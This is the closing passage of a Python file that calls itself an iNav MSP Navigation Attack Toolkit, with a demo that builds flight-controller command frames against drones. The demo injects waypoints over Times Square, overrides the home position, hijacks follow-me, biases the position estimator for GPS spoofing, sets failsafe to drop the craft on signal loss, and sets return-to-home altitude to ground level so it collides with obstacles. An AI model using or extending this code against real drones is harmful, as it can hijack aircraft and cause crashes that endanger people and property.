                nav_cmds.append(('gps', gps))

    return all_frames, nav_cmds


def demo():
    """Demonstrate MSP frame building and parsing."""
    print("=" * 70)
    print("iNav MSP Navigation Attack Toolkit — Demo")
    print("=" * 70)

    # 1. Build a waypoint injection
    print("\n[1] Waypoint injection (WP#1 to Times Square):")
    wp_payload = build_set_wp(
        wp_no=1, action=WP_ACTION_WAYPOINT,
        lat=40.7580, lon=-73.9855, alt_m=30,
        p1=500, flag=WP_FLAG_LAST)
    frame = MSPv2Frame.build(MSP_SET_WP, wp_payload)
    print(f"    Frame: {frame.raw.hex()}")
    print(f"    {frame.describe()}")
    wp = parse_wp(wp_payload)
    print(f"    Parsed: WP#{wp['wp_no']} {wp['action_name']} "
          f"({wp['lat']:.7f}, {wp['lon']:.7f}) alt={wp['alt_m']}m last={wp['is_last']}")

    # 2. Home override
    print("\n[2] Home position override (WP#0):")
    home_frame = build_home_override(lat=40.7128, lon=-74.0060, alt_m=0)
    print(f"    Frame: {home_frame.raw.hex()}")
    print(f"    {home_frame.describe()}")

    # 3. Follow-me hijack
    print("\n[3] Follow-me target (WP#255):")
    fm_frame = build_followme_update(lat=40.7484, lon=-73.9857, alt_m=50, heading=180)
    print(f"    Frame: {fm_frame.raw.hex()}")
    print(f"    {fm_frame.describe()}")

    # 4. Position estimator attack
    print("\n[4] Position estimator — GPS maximized (for GPS spoofing combo):")
    pe_frame = build_set_position_estimation_config(
        w_xy_gps_p=10.0, w_xy_gps_v=10.0, w_z_gps_p=10.0,
        w_z_baro_p=0, w_z_baro_v=0)
    print(f"    Frame: {pe_frame.raw.hex()}")
    print(f"    {pe_frame.describe()}")

    # 5. Failsafe corruption
    print("\n[5] Failsafe → DROP (crash on signal loss):")
    fs_frame = build_set_failsafe_config(
        procedure=FAILSAFE_PROCEDURE_DROP, throttle=1000, off_delay_ds=0)
    print(f"    Frame: {fs_frame.raw.hex()}")
    print(f"    {fs_frame.describe()}")

    # 6. RTH altitude tampering
    print("\n[6] RTH at ground level (obstacle collision):")
    rth_frame = build_set_rth_and_land_config(
        rth_altitude=0, rth_climb_first=0)
    print(f"    Frame: {rth_frame.raw.hex()}")
    print(f"    {rth_frame.describe()}")

    # 7. Mission building
    print("\n[7] Multi-waypoint mission (10-point orbit):")
    orbit = generate_orbit(40.7580, -73.9855, radius_m=100, num_points=8, alt_m=40)
    mission_frames = build_mission(orbit)
    for i, mf in enumerate(mission_frames):
        wp_data = parse_wp(mf.payload)
        print(f"    WP#{wp_data['wp_no']}: ({wp_data['lat']:.7f}, {wp_data['lon']:.7f}) "
              f"last={wp_data['is_last']}")
    print(f"    Total frames: {len(mission_frames)}")

    # 8. Round-trip verification
    print("\n[8] Round-trip verification:")
    test_frame = MSPv2Frame.build(MSP_SET_WP, wp_payload)
    parsed_back, _ = MSPv2Frame.parse(test_frame.raw)
    assert parsed_back is not None, "Parse failed"
    assert parsed_back.cmd == MSP_SET_WP, f"Wrong cmd: {parsed_back.cmd}"
    assert parsed_back.payload == wp_payload, "Payload mismatch"
    wp_back = parse_wp(parsed_back.payload)
    assert wp_back['lat'] == wp['lat'], f"Lat mismatch: {wp_back['lat']} vs {wp['lat']}"
    assert wp_back['lon'] == wp['lon'], f"Lon mismatch"
    print(f"    MSPv2 round-trip: OK ({len(test_frame.raw)} bytes)")

    # MSPv1 round-trip
    v1_frame = MSPv1Frame.build(MSP_SET_WP, wp_payload)
    v1_back, _ = MSPv1Frame.parse(v1_frame.raw)
    assert v1_back is not None, "MSPv1 parse failed"
    assert v1_back.payload == wp_payload, "MSPv1 payload mismatch"
    print(f"    MSPv1 round-trip: OK ({len(v1_frame.raw)} bytes)")

    print("\n" + "=" * 70)
    print("All verifications passed.")
    print("=" * 70)


if __name__ == '__main__':
    demo()
